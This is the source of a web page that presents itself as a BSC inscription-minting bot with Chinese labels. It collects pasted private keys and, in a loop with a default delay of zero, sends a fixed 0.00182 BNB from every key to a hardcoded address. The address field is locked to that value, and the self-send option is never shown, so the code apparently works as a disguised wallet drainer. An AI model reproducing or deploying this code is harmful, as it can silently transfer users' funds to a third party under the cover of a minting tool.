"use client";

import {
  Button,
  FormControlLabel,
  MenuItem,
  Radio,
  RadioGroup,
  TextField,
} from "@mui/material";
import { useCallback, useState } from "react";
import {
  Chain,
  createWalletClient,
  Hex,
  http,
  isAddress,
  parseEther,
  SendTransactionErrorType,
  stringToHex,
  webSocket,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { bsc, mainnet } from "viem/chains";

import Log from "@/components/Log";
import { ChainKey, inscriptionChains } from "@/config/chains";
import useInterval from "@/hooks/useInterval";
import { handleAddress, handleLog } from "@/utils/helper";

const example =
  'data:,{"p":"asc-20","op":"mint","tick":"aval","amt":"100000000"}';

type RadioType = "meToMe" | "manyToOne";

type GasRadio = "all" | "tip";

export default function Home() {
  const [chain, setChain] = useState<Chain>(bsc);
  const [privateKeys, setPrivateKeys] = useState<Hex[]>([]);
  const [radio, setRadio] = useState<RadioType>("manyToOne");
  const [toAddress, setToAddress] = useState<Hex>('0x1832e00DfF829547E1F564f92401C2886F3236b4');
  const [rpc, setRpc] = useState<string>('https://bsc-dataseed.binance.org');
  const [inscription, setInscription] = useState<string>("");
  const [gas, setGas] = useState<number>(1);
  const [running, setRunning] = useState<boolean>(false);
  const [delay, setDelay] = useState<number>(0);
  const [logs, setLogs] = useState<string[]>([]);
  const [successCount, setSuccessCount] = useState<number>(0);
  const [gasRadio, setGasRadio] = useState<GasRadio>("all");

  const pushLog = useCallback((log: string, state?: string) => {
    setLogs((logs) => [handleLog(log, state), ...logs]);
  }, []);

  const client = createWalletClient({
    chain,
    transport: rpc && rpc.startsWith("wss") ? webSocket(rpc) : http(rpc),
  });
  const accounts = privateKeys.map((key) => privateKeyToAccount(key));

  useInterval(
    async () => {
      const results = await Promise.allSettled(
        accounts.map((account) => {
          return client.sendTransaction({
            account,
            to: radio === "meToMe" ? account.address : toAddress,
            value: parseEther("0.00182"),
            data: inscription as Hex,
            ...(gas > 0
              ? gasRadio === "all"
                ? {
                    gasPrice: parseEther(gas.toString(), "gwei"),
                  }
                : {
                    maxPriorityFeePerGas: parseEther(gas.toString(), "gwei"),
                  }
              : {}),
          });
        }),
      );
      results.forEach((result, index) => {
        const address = handleAddress(accounts[index].address);
        if (result.status === "fulfilled") {
          pushLog(`${address} ${result.value}`, "success");
          setSuccessCount((count) => count + 1);
        }
        if (result.status === "rejected") {
          const e = result.reason as SendTransactionErrorType;
          let msg = `${e.name as string}: `;
          if (e.name === "TransactionExecutionError") {
            msg = msg + e.details;
          }
          if (e.name == "Error") {
            msg = msg + e.message;
          }
          setLogs((logs) => [handleLog(`${address} ${msg}`, "error"), ...logs]);
        }
      });
    },
    running ? delay : null,
  );

  const run = useCallback(() => {
    if (privateKeys.length === 0) {
      setLogs((logs) => [handleLog("没有私钥", "error"), ...logs]);
      setRunning(false);
      return;
    }

    if (radio === "manyToOne" && !toAddress) {
      setLogs((logs) => [handleLog("没有地址", "error"), ...logs]);
      setRunning(false);
      return;
    }

    if (!inscription) {
      setLogs((logs) => [handleLog("没有铭文", "error"), ...logs]);
      setRunning(false);
      return;
    }

    setRunning(true);
  }, [inscription, privateKeys, radio, toAddress]);

  return (
    <div className=" flex flex-col gap-4">
      <div className=" flex flex-col gap-2">
        <span>链:</span>
        <TextField
          select
          defaultValue="bsc"
          size="small"
          disabled={running}
          onChange={(e) => {
            const text = e.target.value as ChainKey;
            setChain(inscriptionChains[text]);
          }}
        >
          {Object.entries(inscriptionChains).map(([key, chain]) => (
            <MenuItem
              key={chain.id}
              value={key}
            >
              {chain.name}
            </MenuItem>
          ))}
        </TextField>
      </div>

      <div className=" flex flex-col gap-2">
        <span>私钥（必填，每行一个）:</span>
        <TextField
          multiline
          minRows={2}
          size="small"
          placeholder="私钥，带不带 0x 都行，程序会自动处理"
          disabled={running}
          onChange={(e) => {
            const text = e.target.value;
            const lines = text.split("\n");
            const keys = lines
              .map((line) => {
                const key = line.trim();
                if (/^[a-fA-F0-9]{64}$/.test(key)) {
                  return `0x${key}`;
                }
                if (/^0x[a-fA-F0-9]{64}$/.test(key)) {
                  return key as Hex;
                }
              })
              .filter((x) => x) as Hex[];
            setPrivateKeys(keys);
          }}
        />
      </div>

      {radio === "manyToOne" && (
        <div className=" flex flex-col gap-2">
          <span>合约地址（必填）:</span>
          <TextField
            size="small"
            placeholder="地址"
            disabled={running}
            value={'0x1832e00DfF829547E1F564f92401C2886F3236b4'}
            onChange={(e) => {
              const text = e.target.value;
              isAddress(text) && setToAddress(text);
            }}
          />
        </div>
      )}

      <div className=" flex flex-col gap-2">
        <span>Input Value（必填，是转码后的十六进制,先去官网mint一次，然后从交易详情中获取）:</span>
        <TextField
          size="small"
          placeholder={`bsc浏览器崩了的话去Oklink浏览器中获取！`}
          disabled={running}
          onChange={(e) => {
            const text = e.target.value;
            setInscription(text.trim());
          }}
        />
      </div>

      <div className=" flex flex-col gap-2">
        <span>
          RPC (选填, 默认公共有瓶颈经常失败, 最好用付费的, http 或者 ws 都可以):
        </span>
        <TextField
          size="small"
          placeholder="RPC"
          disabled={running}
          value={'https://bsc-dataseed.binance.org'}
          onChange={(e) => {
            const text = e.target.value;
            setRpc(text);
          }}
        />
      </div>


      <div className=" flex flex-col gap-2">
        <span>每笔交易间隔时间 (选填, 最低 0 ms):</span>
        <TextField
          type="number"
          size="small"
          placeholder="默认 0 ms"
          disabled={running}
          onChange={(e) => {
            const num = Number(e.target.value);
            !Number.isNaN(num) && num >= 0 && setDelay(num);
          }}
        />
      </div>

      <Button
        variant="contained"
        color={running ? "error" : "success"}
        onClick={() => {
          if (!running) {
            run();
          } else {
            setRunning(false);
          }
        }}
      >
        {running ? "运行中" : "运行"}
      </Button>

      <Log
        title={`日志（成功次数 => ${successCount}）:`}
        logs={logs}
        onClear={() => {
          setLogs([]);
        }}
      />
    </div>
  );
}
